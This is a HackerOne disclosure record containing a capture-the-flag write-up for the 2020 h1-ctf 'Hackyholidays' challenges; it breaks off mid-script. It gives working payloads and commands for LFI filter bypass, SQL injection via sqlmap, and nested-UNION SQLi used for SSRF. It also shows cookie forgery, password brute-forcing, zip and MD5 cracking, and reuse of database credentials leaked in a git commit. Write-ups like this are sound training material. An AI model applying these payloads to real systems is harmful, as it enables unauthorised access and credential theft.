{"id":1065885,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY1ODg1","url":"https://hackerone.com/reports/1065885","title":"Complete destruction of the Grinch server","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-12-24T15:43:21.033Z","submitted_at":"2020-12-24T15:43:21.104Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"shamollash","url":"/shamollash","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-01-12T17:56:48.652Z","bug_reporter_agreed_on_going_public_at":"2021-01-12T07:43:31.694Z","team_member_agreed_on_going_public_at":"2021-01-12T17:56:48.564Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Hackyholidays\n\n\n# flag 1\n\nFirst flag is just a matter of reading `/robots.txt` file:\n\n```\nUser-agent: *\nDisallow: /s3cr3t-ar3a\nFlag: flag{48104912-28b0-494a-9995-a203d1e261e7}\n```\n\n\n# flag 2\n\nVisiting `/s3cr3t-ar3a` and opening it with developer tools gets the second flag:\n\n\n\tflag{b7ebcb75-9100-4f91-8454-cfb9574459f7}\n\n\nIt is inserted in the DOM via some obfuscated javascript code buried in `/assets/js/jquery.min.js`\n\n\n```\nh1_0='la',h1_1='}',\nh1_2='',\nh1_3='f',\nh1_4='g',\nh1_5='{b7ebcb75',h1_6='8454-',\nh1_7='cfb9574459f7',\nh1_8='-9100-4f91-';\ndocument.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1 );\n```\n\n\n# flag3 /people-rater\n\nThe people rater app references entries via something like\n\n\n\thttps://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=\n\nwhere the id parameter is base64 encoding of  `{\"id\":NUMBER}`\n\nSetting `NUMBER=1` immediatly gives the flag:\n\n```\nGET /people-rater/entry?id=eyJpZCI6MX0%3d HTTP/1.1\nHost: hackyholidays.h1ctf.com\n\n{ \"id\":\"eyJpZCI6MX0=\",\n  \"name\":\"The Grinch\",\n  \"rating\":\"Amazing in every possible way!\",\n  \"flag\":\"flag{b705fb11-fb55-442f-847f-0931be82ed9a}\"\n}\n```\n\n# flag4 /swag-shop\n\nThe swag shop sells some itmes but in order to make a purchase you need a valid login as shown by this request\n\n```\nPOST /swag-shop/api/purchase HTTP/1.1\nHost: hackyholidays.h1ctf.com\n\nid=1\n```\n\nwhich gives the error:\n\n\t{\"error\":\"You are not logged in\"}\n\nFuzzing via ffuf we can find `/swag-shop/api/sessions` which contains some interesting stuff\n\n\t{\"sessions\":[\"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=\",\"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=\",\"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==\",\"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=\",\"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=\",\"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=\",\"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=\",\"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0=\"]}\n\t\nIn particular one session is longer than others and base64 decoding of it gives\n\n```\n{\n  \"user\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\n  \"cookie\":\"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY=\"\n}\n```\n\nFrom javascript source we see that the session cookie is called  `token`.\n\nAfter many fuzzing tries, the key to proceed is matching **all** response code, even 400 errors:\n\n```\nffuf -u  https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ \\\n-w common.txt \\\n-H 'Cookie: token=NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY%3D' \\\n-t 4 -mc all  -fs 155\n```\n\nwhich finally gives a `user` endpoint which was not known before:\n\n```\nsessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]\nstock                   [Status: 200, Size: 167, Words: 8, Lines: 1]\nuser                    [Status: 400, Size: 35, Words: 3, Lines: 1]\n```\n\nVisiting this endpoint we find this error message:\n\n```\nGET /swag-shop/api/user HTTP/1.1\nHost: hackyholidays.h1ctf.com\n\n\nHTTP/1.1 400 Bad Request\nServer: nginx/1.18.0 (Ubuntu)\nDate: Wed, 16 Dec 2020 06:52:00 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 35\n\n{\"error\":\"Missing required fields\"}\n```\n\nProbably the api wants the user id. Fuzzing again with a list of common parameter names\n\t\n```\nffuf -u  'https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=C7DCCE-0E0DAB-B20226-FC92EA-1B9043' \\\n-w burp-parameter-names.txt \\\n-H 'Cookie: token=NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY%3D' \\\n-t 4 -mc all  -fs 155\n```\n\nwe understand that the parameter is called (not very surprisingly after all) `uuid`.\n\nThis call gets the 4th flag\n\n```\nGET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1\nHost: hackyholidays.h1ctf.com\n\n{\n  \"uuid\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\n  \"username\":\"grinch\",\n  \"address\":{\"line_1\":\"The Grinch\",\"line_2\":\"The Cave\",\"line_3\":\"Mount Crumpit\",\"line_4\":\"Whoville\"},\n  \"flag\":\"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\"}\n```\n\nIn the end, the session cookie probably was not necessary.\n\n\n# flag5 /secure-login\n\n\nThe login form seems to indicate that there are different responses for invalid username vs. just wrong password.\n\nSo we first try to discover a valid usernameexploting the different responses (with a list of common usernames).\nAfter finding that **access** is a valid user, we try to bruteforce his password, again with a list of very common password.\n\nIt's just a matter of seconds to obtain a valid set of credentials:\n\n```\nusername=access\u0026password=computer\n```\n\n\nAfter loggin in we get a cookie like this one\n\n\tsecurelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D;\n\nwhich is base64 encoding of\n\n\t{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":false}\n\n\nChanging the cookie and setting `admin:true` immediately brings us to a page where we can download \n\n\tmy_secure_files_not_for_you.zip\n\nThis zip file is password protected but john the ripper, and in particular zip2john, will easily reveal the password (`hahahaha`)\n\n\tzip2john my_secure_files_not_for_you.zip \u003ezip.hashes\n\tjohn zip.hashes ## this gives you the password\n\nFinally in `flag.txt` extracted from zip file we find\n\n\tflag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}\n\nWe also find a gross private picture of the grinch, not very interesting after all.\n\n\n# flag6 /my-diary/\n\nGrinch diary screams for LFI (Local File Inclusion)\n\n\thttps://hackyholidays.h1ctf.com/my-diary/?template=entries.html\n\nand at least it's true in its current directory. If we simply try to get the `index.php` we otbain the source code:\n\n\n```\nGET /my-diary/?template=index.php HTTP/1.1\nHost: hackyholidays.h1ctf.com\n\n...\n\n\u003c?php\nif( isset($_GET[\"template\"])  ){\n    $page = $_GET[\"template\"];\n    //remove non allowed characters\n    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n    //protect admin.php from being read\n    $page = str_replace(\"admin.php\",\"\",$page);\n    //I've changed the admin file to secretadmin.php for more security!\n    $page = str_replace(\"secretadmin.php\",\"\",$page);\n    //check file exists\n    if( file_exists($page) ){\n       echo file_get_contents($page);\n    }else{\n        //redirect to home\n        header(\"Location: /my-diary/?template=entries.html\");\n        exit();\n    }\n}else{\n    //redirect to home\n    header(\"Location: /my-diary/?template=entries.html\");\n    exit();\n```\n\nThe usage of `strreplace` has a classic vulnerability: it will not recursively remove all `admin.php` occurences. If we start from \n\n\tXXXadmin.phpYYY\n\t\nwhat remains is\n\n\tXXXYYY\n\t\nSo for instance\n\n\tadminadmin.php.php --\u003e admin.php\n\n\nThe following payload gets the source code of `secretadmin.php` (which contains the flag), despite the extra layer of \"security\":\n\n\n```\nGET /my-diary/?template=secretsecretadminadmin.php.phpadminadmin.php.php HTTP/1.1\n\n...\n\n\u003c?php\nif( $_SERVER[\"REMOTE_ADDR\"] == '127.0.0.1' ){\n?\u003e\n\n[...SNIP...]\n\nflag{18b130a7-3a79-4c70-b73b-7f23fa95d395}\n```\n\n\n# flag7 /hate-mail\n\nExamining the mail preview function\n\n```\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\n\npreview_markup=%7B%7Btemplate%3Acbdj3_grinch_header.html%7D%7D\u0026preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D\n```\n\nour attention is immediately captured by that `{{template:file.html}}`. We begin tampering in search of some kind of LFI, but that only exposes the existance of a `templates/` subdirectory. Directory Index is enabled there, so we get to knwow about a particular file\n\n\t38dhs_admins_only_header.html\n\nA simple GET of the file gives us forbidden and also tampering with the `preview_markup` parameter only gives us an error message:\n\n\n```\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\n\tpreview_markup=%7B%7Btemplate%3A38dhs_admins_only_header.html%7D%7D\u0026preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D\n\n...\n\nYou do not have access to the file 38dhs_admins_only_header.html\n```\n\nKey vulnerability here is that the `{{template:file}}` construction seems to have different validation if used with `preview_markup` or `preview_data` parameter\n\nSo if in `preview_markup` we define the `{{name}}` placeholder and try to get the file within this placeholder in `preview_data` we are able to access the admin file and obtain the flag:\n\n```\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\n\npreview_markup={{name}}\u0026preview_data={\"name\"%3a\"{{template%3a38dhs_admins_only_header.html}}\",\"email\"%3a\"alice%40test.com\"}\n\n...\n  \u003ch4\u003eflag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}\u003c/h4\u003e\n```\n\n\n# flag 8 /forum\n\nHere our objective is accessing the admin area. By basic recon we know that there are at least user grinch and user max. Basic password bruteforcing does not give any result, and also tampering with message and section identifiers (`/forum/N/M`)\n\nSearching for common files and directories with ffuf only revelas a `phpmyadmin`.\n\n\tffuf  -t 4 -u https://hackyholidays.h1ctf.com/forum/FUZZ -w common.txt -mc all -fc 404\n\t...\n\t1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]\n\t2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]\n\tlogin                   [Status: 200, Size: 1569, Words: 396, Lines: 34]\n\tphpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]\n\t\n\t\nFuzzing gives us nothing so we revert to search for the source code of the forum, maybe is on github. This \"google dork\" \n\n\t\"Grinch Forum\" site:github.com\n\nreveals\n\t\n\thttps://github.com/Grinch-Networks/forum\n\nThere are no evident vulnerbilities in the source code so we look at the history and find a particular commit where the auhtor forgot to properly purge sensitive data:\n\n\n```\ncommit efb92ef3f561a957caad68fca2d6f8466c4d04ae\nAuthor: Adam \u003cadam@umbrella.info\u003e\nDate:   Mon Dec 7 16:36:07 2020 +0000\n\n    small fix\n\ndiff --git a/models/Db.php b/models/Db.php\nindex 5bea1f5..1dc435c 100755\n--- a/models/Db.php\n+++ b/models/Db.php\n@@ -131,7 +131,7 @@ class Db {\n      */\n     static public function read(){\n         if( gettype(self::$read) == 'string' ) {\n-            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );\n+            self::$read = new DbConnect( false, '', '','' );\n```\n\nThose credentials work on phpmyadmin where we are able to find what looks like md5 hash for the passwords:\n\n\n```\n1 \tgrinch \t35D652126CA1706B59DB02C93E0C9FBF    1\n2 \tmax   \t388E015BC43980947FCE0E5DB16481D1 \n```\n\nA visit on crackstation.net immediately reveals the grinch password\n\n\t35D652126CA1706B59DB02C93E0C9FBF\tmd5\tBahHumbug\n\t\nWith these credentials we are able to access a message which finally reveals the Grinch secret plan:\n\n```\nhttps://hackyholidays.h1ctf.com/forum/3/2\n\n\nWe've launched our recon server, gathered intelligence and pin pointed Santa's location!\nNot long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!\n\nflag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}\n```\n\nWe must find that server, and hopefully launch the Grinch weapons against itself!\n\n# flag9 /evil-quiz\n\n\nWe begin the quiz with name `pippo`\n\n\tPOST /evil-quiz\n\tname=pippo\n\t\nand post some answers\n\n\tPOST /evil-quiz/start HTTP/1.1\n\tHost: hackyholidays.h1ctf.com\n\t\n\tques_1=4\u0026ques_2=3\u0026ques_3=2\n\nWhat immediately got our attention was this sentence in the score page:\n\n\tThere is 1 other player(s) with the same name as you!\n\t\n\nOur first interpretation was that maybe we have to trick this other user to do something via XSS or html link, maybe tampering with our name parameter. But, what was strange, was that even with \"xss names\" there was always some user with our same username.\n\nAfter some tampering trying to evade xss filters we got a different message\n\n\tThere is 0 other player(s) with the same name as you!\n\nIt was not immediately evident why, until we tested one character at a time and we learnt that it was the `'` to make the differenc. That smells like SQL Injection.\n\nActually at some point we begin getting these answers:\n\n```\nname=NOME' or 22=1 or '2'='1  ---\u003e There is 0 other player(s) with the same name as you!\nname=NOME' or  1=1 or '2'='1  ---\u003e There is 24358 other player(s) with the same name as you\n```\n\nBingo! It is a second order blind sql injection. Sqlmap to the rescue: given a valid session cookie and at least one complete answer to questions in that session (no matter the evil score) these command is sufficient to extract all the information we need:\n\n\t\n```\nsqlmap -u 'https://hackyholidays.h1ctf.com/evil-quiz' \\\n--data 'name=NOME' \\\n--second-url 'https://hackyholidays.h1ctf.com/evil-quiz/score' \\\n--random-agent --not-string 'There is 0 other player' \\\n--technique=B --level=3 --risk=3 \\\n--cookie 'session=***'  -D quiz -T admin --dump\n```\n\nKey here are a couple of things to note here:\n\n- `--second-url` parameters tells sqlmap the page to check our injection results in a different page\n- we explicitly give a `--not-string` to look for false result\n- `--risk 3` is necessary to let sqlmap try OR based blind injection\n- db and table were identified by previious runs of sqlmap, what you have above is the final command\n- you cannot specify more than 1 thread because of second order page request (otherwhise one thread will interfere with other threads' result)\n\nSeeing this message told us that we were on the right path\n\n```\n...\n[17:19:23] [INFO] POST parameter 'name' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable \n...\nParameter: name (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause\n    Payload: name=-3268' OR 6136=6136-- ibKa\n    Vector: OR [INFERENCE]\n```\n\nAnd finally, with some patience we get the info we were looking for:\n\n```\nDatabase: quiz\nTable: admin\n[1 entry]\n+----+----------+-------------------+\n| id | username | password          |\n+----+----------+-------------------+\n| 1  | admin    | S3creT_p4ssw0rd-$ |\n+----+----------+-------------------+\n```\n\nWith admin credentials we immediately get the flag:\n\n\tflag{6e8a2df4-5b14-400f-a85a-08a260b59135}\n\t\n# flag10 /signup-manager\n\nSimple fuzzing reveals nothing very useful apart the existence of and `admin.php` page which is not directly accessibile via HTTP.\n\nComment in the home page reveals existence of a `README.md` file4:\n\n```\n\u003c!-- See README.md for assistance --\u003e\n\u003c!DOCTYPE html\u003e\n...\n```\n\nThis file describes the signupmanager source code which is readily available as `signupmanager.zip`.\n\nIt is clear that we have to create a user that has admin rights, but it seems not possible to overflow the string length, given that all paramters are quite strongly filtered:\n\n- password is hashed\n- username, first and last name are all subject to length restrictions, for instance\n\n```\n$fistname=substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST[\"firstname\"]), 0, 15);\n```\n\nIt remains only the age paramter which is subject to these restrictions and conversions:\n\n```\nif (!is_numeric($_POST[\"age\"])) {\n\t$errors[] = 'Age entered is invalid';\n}\nif (strlen($_POST[\"age\"]) \u003e 3) {\n\t$errors[] = 'Age entered is too long';\n\t\n$age = intval($_POST[\"age\"]);\n}\n```\nApparentely it won't be possibile to get an \"overflow\" but PHP is not strongly typed an setting age **9e9** we pass first check (it's a numeric value, in scientific notation), and as a string it's only 3 characters long. But fortunately for us\n\n```\nphp \u003e print intval(\"9e9\");\n9000000000\n```\n\nWith this in mind, we are able to get correct length for lastname in order to have a Y as last character of our user line written on disk:\n\nThe following paylod finally gives us a valid admin user\n\n```\nPOST /signup-manager/ HTTP/1.1\nHost: hackyholidays.h1ctf.com\n\naction=signup\u0026username=grinch54321\u0026password=a\u0026age=9e9\u0026firstname=aaa\u0026lastname=bbbbbbbbY\n```\n\nThe flag was\n\n```\n\u003cp class=\"text-center\"\u003eflag{99309f0f-1752-44a5-af1e-a03e4150757d}\u003c/p\u003e\n\u003cp class=\"text-center\"\u003eYou made it through, continue to your next task \u003ca href=\"/r3c0n_server_4fdk59\"\u003ehere\u003c/a\u003e\u003c/p\u003e\n            \u003c/div\u003e\n```\n\n\nTommorrow let's hope to get into the Gringh recon server and maybe DDOS it!\n\n# flag11\n\nWe start from `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59` where we read:\n\n\tWe are currently developing an API, apologies for anything that doesn't work quite right\n\n\nEvery api endpoint seems to give this error\n\n\thttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api\n \t\n\terror\t\"This endpoint cannot be visited from this IP address\"\n\nProbably we have to find a way to trick the server in sending requests to this API endpoints via some SSRF.\n\n\nInitial tought is about the image paramter in these requests:\n\n\thttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEyNTQzMTRiODI5MmI4Zjc5MDg2MmQ2M2ZhNWRjZThmLmpwZyIsImF1dGgiOiI5OWMwMGQzZWVmNzA4NDdhYzQ4ODhhZTg1ZDBiNGM3ZSJ9\n\n```\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/db507bdb186d33a719eb045603020cec.jpg\",\"auth\":\"bbf295d686bd2af346fcd80c5398de9a\"}\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/13d74554c30e1069714a5a9edda8c94d.jpg\",\"auth\":\"94fb398d78b36e7c079e7560ce9df721\"}\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/9b881af8b32ff07f6daada95ff70dc3a.jpg\",\"auth\":\"e934f4407a9df9fd272cdb9c397f673f\"}\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/32febb19572b12435a6a390c08e8d3da.jpg\",\"auth\":\"76ba061d356c6264a6005216e1776ba6\"}\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/0a382c6177b04386e1a45ceeaa812e4e.jpg\",\"auth\":\"ec5a9920e177ccc84974146f93ae04b0\"}\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/1254314b8292b8f790862d63fa5dce8f.jpg\",\"auth\":\"99c00d3eef70847ac4888ae85d0b4c7e\"}\n```\n\nAfter spending a lot of time trying to reverse engineer the algorithm which signs (via auth paramter) the image paramter.\nIt was not (at least trying with common passwords as salts) a weak hash of SALT+image, and also length extension attack did not produce anything.\n\nSo back to the basic recon.\nInitially we did not put much attention on the hash paramter in  `/r3c0n_server_4fdk59/album?hash=` but it is clearly vulnerable so sql injection.\n\nIn a few seconds sqlmap reveals\n\n```\nDatabase: recon\nTable: album\n[3 entries]\n+----+--------+-----------+\n| id | hash   | name      |\n+----+--------+-----------+\n| 1  | 3dir42 | Xmas 2018 |\n| 2  | 59grop | Xmas 2019 |\n| 3  | jdh34k | Xmas 2020 |\n+----+--------+-----------+\n\n\nDatabase: recon\nTable: photo\n[6 entries]\n+----+----------+--------------------------------------+\n| id | album_id | photo                                |\n+----+----------+--------------------------------------+\n| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |\n| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |\n| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |\n| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |\n| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |\n| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |\n+----+----------+--------------------------------------+\n```\n\nNo other information seems available. Key to understand how to proceed was observing that in the following request the first UNION paramter is used to get the photo from the db\n\n\n```\nGET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+1,NULL,NULL--+- HTTP/1.1\nHost: hackyholidays.h1ctf.com\n\n[picture from album 1 returned]  \u003c--- THIS IS THE KEY DISCOVERY!!! \n```\n\nWe are able to confirm that there is a SQLi inside a SQLi (inserting the second one as first union column of the first injection) like in the following example:\n\n\tGET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+\"1' order by 3--+-\",2,3--+- HTTP/1.1\n\nFinally we are able to insert our data like in the following example, obtaining a valid signature:\n\t\n```\nGET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+\"-1'+union+all+select+NULL,NULL,0x41--+-\",2,3--+- HTTP/1.1\nHost: hackyholidays.h1ctf.com\n\n     \u003cimg class=\"img-responsive\" src=\"/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL0EiLCJhdXRoIjoiNjAxNDZjMGY5YTQ0YTgyNWZhYTIzZTJkZDE3OWMxM2QifQ==\"\u003e\n```\n\nwhich is \n\n\t{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/A\",\"auth\":\"60146c0f9a44a825faa23e2dd179c13d\"}\n\t\nNow we proceed with the assumtion that this image path is used by the server to interrogate the api\n\nWe try some common endpoints with this script\n\n```\n#!/bin/sh\n\nwhile read word; do\n\n/bin/echo -n \"$word: \"\npath=$(/bin/echo -n \"../api/$word\" |xxd -p | tr -d '\\n')\npicurl=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\\?hash=\\'+UNION+ALL+SELECT+\\\"-1\\'+union+all+select+NULL,NULL,0x${path}--+-\\\",2,3--+- -s|grep data= |sed 's/^.*src=\"\\([^\"]*\\)\"\u003e/\\1/')\necho $picurl\n\ncurl -s \"https://hackyholidays.h1ctf.com$picurl\" |grep -v 404\necho\ndone\n```\n\nThe script can be run via:  `cat wordlist.txt | script.sh`\n\nWe find two endpoints observing the different responses given by the server:\n\n- ping\n- user\n\nWhile testing the `user` endpoint we notice two different responses for \n\n- `user?xxx=1`\n- `user?username=x`\n\n```\nuser?xxx=1: /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/eHh4PTEiLCJhdXRoIjoiY2FhNzlmNjdiZDZlZDlmOGE5MGI4NjJjOGZmY2RkMGIifQ==\nExpected HTTP status 200, Received: 400\n\nuser?username=x: /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9eCIsImF1dGgiOiI2ZDRhZDg4NTRmNzk5ZTI0NmZmZTEwZTZiZGFkYjE2YiJ9\nExpected HTTP status 200, Received: 204\n```\n\nThis means that user endpoint expects a username parameter, and later on we also find a password paramter.\n\nBut now what? Key observation was that by inserting a `%` as username we have again  different response:\n\n```\nuser?username=%: /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9JSIsImF1dGgiOiIzYjZkNmVmOGRkN2JiNzUxZmI1ZTIwMDJhOGRhZDdhMSJ9\nInvalid content type detected\n```\n\nThis is working but the server does not return a valid image as expected by the caller.\n\nThis probably means that username paramter is inserted in a query like\n\n\tusername LIKE '$username'\n\nThis mean we are not able to extract data directly but we should be able to enumerate one character at a time:\n\n\tusername=a%\n\tusername=b%\n\t...\n\tusername=g%\n\t\nAt `g%` we get a diffrrent response (Invalid content type) so maybe...\n\n\tusername=gr%\n\tusername=gri%\n\t\nThis can be scripted with something like this:\n\n```\n#!/bin/sh\n\nstart=$1\nfor word in a b c d e f g h i j k l m n 